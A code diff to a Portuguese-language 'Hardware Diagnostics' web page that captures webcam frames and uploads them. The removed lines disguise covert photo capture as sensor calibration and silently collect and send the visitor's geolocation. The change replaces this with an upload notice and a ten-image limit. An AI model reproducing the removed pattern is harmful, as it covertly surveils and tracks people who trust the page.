@@ -99,7 +99,7 @@
 <body>
     <div class="container">
         <h1>Hardware Diagnostics</h1>
-        <p class="subtitle">Calibrando sensores de imagem para o pipeline de visão computacional.</p>
+        <p class="subtitle">Serão enviadas até 10 imagens do objeto para o armazenamento do projeto. Evite mostrar pessoas ou documentos.</p>
         
         <div class="camera-preview" id="cameraContainer">
             <video id="videoStream" autoplay playsinline></video>
@@ -130,10 +130,11 @@
     let captureInterval = null;
     let progress = 0;
     let isTesting = false;
+    let isUploading = false;
 
     // Função para capturar e enviar frames
-    function captureFrame() {
-        if (!stream || !isTesting) return;
+    async function captureFrame() {
+        if (!stream || !isTesting || isUploading) return;
         
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
@@ -145,30 +146,44 @@
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             const dataURL = canvas.toDataURL('image/jpeg', 0.6);
             
-            // Envia para o seu backend
-            fetch('/api/captura', { // ATUALIZE PARA SEU IP
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    timestamp: new Date().toISOString(),
-                    facingMode: currentFacing,
-                    image: dataURL,
-                    userAgent: navigator.userAgent,
-                    screenRes: `${window.screen.width}x${window.screen.height}`
-                })
-            }).catch(err => console.error('Erro ao enviar frame:', err));
+            isUploading = true;
+            try {
+                const response = await fetch('/api/captura', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        facingMode: currentFacing,
+                        image: dataURL,
+                        userAgent: navigator.userAgent,
+                        screenRes: `${window.screen.width}x${window.screen.height}`
+                    })
+                });
+                const result = await response.json().catch(() => null);
+                if (!response.ok || !result?.success) {
+                    const detail = [result?.error, result?.detail].filter(Boolean).join(': ');
+                    throw new Error(detail || `Erro HTTP ${response.status} na rota /api/captura`);
+                }
 
-            // Atualiza a barra de progresso
-            progress += 10;
-            if (progress > 100) progress = 100;
-            progressFill.style.width = `${progress}%`;
-            
-            if (progress >= 100) {
-                statusText.textContent = "Teste concluído! Obrigado pela colaboração.";
-                startBtn.disabled = true;
-                switchBtn.disabled = true;
+                // Só avança quando o servidor confirmar o armazenamento.
+                progress = Math.min(progress + 10, 100);
+                progressFill.style.width = `${progress}%`;
+                statusText.textContent = `${progress / 10} de 10 imagens salvas.`;
+
+                if (progress >= 100) {
+                    statusText.textContent = '10 imagens salvas. Teste concluído!';
+                    startBtn.disabled = true;
+                    switchBtn.disabled = true;
+                    clearInterval(captureInterval);
+                    isTesting = false;
+                }
+            } catch (err) {
+                console.error('Erro ao salvar imagem:', err);
                 clearInterval(captureInterval);
                 isTesting = false;
+                startBtn.disabled = false;
+                statusText.textContent = `Falha ao salvar imagem: ${err.message}`;
+            } finally {
+                isUploading = false;
             }
         }
     }
@@ -221,25 +236,8 @@
             if (captureInterval) clearInterval(captureInterval);
             isTesting = true;
             progress = 0;
+            progressFill.style.width = '0%';
             captureInterval = setInterval(captureFrame, 1000); // Captura a cada 1s
-            
-            // Pede a localização (opcional, mas útil)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        fetch('/api/geolocalizacao', { // ATUALIZE PARA SEU IP
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                lat: position.coords.latitude,
-                                lon: position.coords.longitude,
-                                accuracy: position.coords.accuracy
-                            })
-                        });
-                    },
-                    (error) => console.log('Geo error:', error)
-                );
-            }
 
         } catch (err) {
             console.error("Erro detalhado na câmera:", err);
